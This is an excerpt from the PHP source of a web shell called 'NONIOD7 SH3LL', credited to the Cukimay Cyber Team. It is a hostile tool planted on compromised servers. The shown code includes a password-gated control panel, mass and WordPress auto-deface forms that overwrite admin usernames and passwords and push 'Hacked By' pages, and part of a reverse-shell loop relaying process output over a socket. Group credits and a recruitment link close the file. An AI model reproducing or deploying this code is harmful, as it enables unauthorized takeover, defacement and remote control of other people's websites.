...
<link href='https://preview.ibb.co/dRwEsf/Pics-Art-11-02-01-07-31.png' rel='icon' type='image/x-icon'/>
<style type="text/css">
html {
     background:black;
     background-image:url('https://preview.ibb.co/dRwEsf/Pics-Art-11-02-01-07-31.png');
...
<fieldset>
        ...
        <form method="post">
<input type="text" name="id" value="Jangan di Path OK">
</form>
Password
<form method="post">
...
<head>
<title>NONIOD7</title>
<meta name='author' content='Shell From Noniod7'>
<meta charset="UTF-8">
<link href='https://preview.ibb.co/dRwEsf/Pics-Art-11-02-01-07-31.png' rel='icon' type='image/x-icon'/>
<style type='text/css'>
...
html {
    background: black;
     background-image:url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyOMmAWVvI6ykbpJpwQD21cTz4-8z8KiasRcW9VhYc_8GP_jJibA);
...
echo "<BR>";
echo "<center><font size='6px' color='lavender'>[=-NONIOD7 SH3LL-=]</font>";
echo "<br>";
echo "<p>";
...
echo "<li> <a href='?dir=$dir&do=autoklik'>Priv Auto Deface From Noniod7</a> </li>";
...
<tr><td><center><font color="gold">No Girl No Drinks..
    <p><font color="Lavender">Thanks To : CUKIMAY CYBER TEAM   </font>
<br><a href="https://chat.whatsapp.com/B7OEFyZtcfqC3HiaQw3qK3">JOIN TO GROUP OFFICIAL CUKIMAY</a>
    <br><font color="Lavender"><font></font> <br>Create By NONIOD7 From CUKIMAY
</td></tr>
...
?>
<form method="post">
<input type="submit" name="s" value="cct.php">
</form>
<?php
$targets = explode("\r\n", $_POST['targets']);
if($_POST['s']) {
...
if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);$rsres = " ";$s_result .= $rsres;}
    ...
    if($_POST['hajar']) {
        ...
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='Nod' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='nod' placeholder='pass_baru'><br>
...
echo "<center><form method='post'>
        ...
        <u>Team</u>: <br>
        <input type='text' name='tim' size='50' value='Cukimay Cyber Team'><br>
        <u>Domains</u>: <br>
...
echo "</center></table>";  
    ...
    if($_POST['auto_deface_wp']) {
        ...
        <input type='text' name='script' height='10' size='50' placeholder='Hacked By Noniod7' required><br>
    ...
    echo "<center>Copyright @ ".date("Y")." - Cukimay</font></a></center>";
}
?>